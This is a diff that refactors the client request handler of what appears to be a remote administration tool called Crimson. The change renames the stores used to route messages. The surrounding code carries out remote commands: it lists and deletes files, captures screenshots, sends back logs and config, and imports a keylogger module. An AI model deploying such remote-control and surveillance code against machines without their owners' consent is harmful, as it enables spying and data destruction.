@@ -32,10 +32,10 @@ import org.slf4j.LoggerFactory;
 
 import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.client.Client;
-import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Power;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
+import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
@@ -63,6 +63,7 @@ import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreensho
 import com.subterranean_security.crimson.core.proto.State.RS_ChangeClientState;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
+import com.subterranean_security.crimson.core.store.FileManagerStore;
 import com.subterranean_security.crimson.core.stream.Stream;
 import com.subterranean_security.crimson.core.stream.StreamStore;
 import com.subterranean_security.crimson.core.stream.remote.RemoteSlave;
@@ -290,7 +291,7 @@ public class ClientExecutor extends BasicExecutor {
 
 		RQ_FileListing rq = m.getRqFileListing();
 		log.debug("file_listing_rq. fmid: " + rq.getFmid());
-		LocalFS lf = ClientStore.LocalFilesystems.get(rq.getFmid());
+		LocalFS lf = FileManagerStore.get(rq.getFmid());
 		if (rq.hasUp() && rq.getUp()) {
 			lf.up();
 		} else if (rq.hasDown()) {
@@ -302,7 +303,7 @@ public class ClientExecutor extends BasicExecutor {
 
 		}
 		try {
-			ClientStore.Connections.route(Message.newBuilder().setId(m.getId())
+			ConnectionStore.route(Message.newBuilder().setId(m.getId())
 					.setRsFileListing(RS_FileListing.newBuilder().setPath(lf.pwd()).addAllListing(lf.list()))
 					.setSid(m.getRid()).setRid(m.getSid()));
 		} catch (IOException e) {
@@ -313,20 +314,20 @@ public class ClientExecutor extends BasicExecutor {
 
 	private void rq_file_handle(Message m) {
 		log.debug("rq_file_handle");
-		ClientStore.Connections
+		ConnectionStore
 				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid()).setRsFileHandle(
-						RS_FileHandle.newBuilder().setFmid(ClientStore.LocalFilesystems.add(new LocalFS(true, true)))));
+						RS_FileHandle.newBuilder().setFmid(FileManagerStore.add(new LocalFS(true, true)))));
 	}
 
 	private void rq_advanced_file_info(Message m) {
 		log.debug("rq_advance_file_info");
-		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
+		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
 				.setRsAdvancedFileInfo(LocalFS.getInfo(m.getRqAdvancedFileInfo().getFile())));
 	}
 
 	private void rq_delete(Message m) {
 		log.debug("rq_delete");
-		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
+		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
 				.setRsDelete(RS_Delete.newBuilder()
 						.setOutcome(LocalFS.delete(m.getRqDelete().getTargetList(), m.getRqDelete().getOverwrite()))));
 	}
@@ -354,7 +355,7 @@ public class ClientExecutor extends BasicExecutor {
 	}
 
 	private void rq_get_client_config(Message m) {
-		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
+		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
 				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(Client.ic)));
 	}
 
@@ -385,7 +386,7 @@ public class ClientExecutor extends BasicExecutor {
 			e.printStackTrace();
 			return;
 		}
-		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
+		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
 				.setRsQuickScreenshot(RS_QuickScreenshot.newBuilder().setBin(ByteString.copyFrom(baos.toByteArray()))));
 		try {
 			baos.close();
@@ -405,7 +406,7 @@ public class ClientExecutor extends BasicExecutor {
 				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
 			}
 		}
-		ClientStore.Connections
+		ConnectionStore
 				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid).setRsLogs(rs));
 	}
 
@@ -449,7 +450,7 @@ public class ClientExecutor extends BasicExecutor {
 				}
 			}
 		} finally {
-			ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
+			ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
 					.setRsChangeSetting(RS_ChangeSetting.newBuilder().setResult(outcome)));
 		}
 
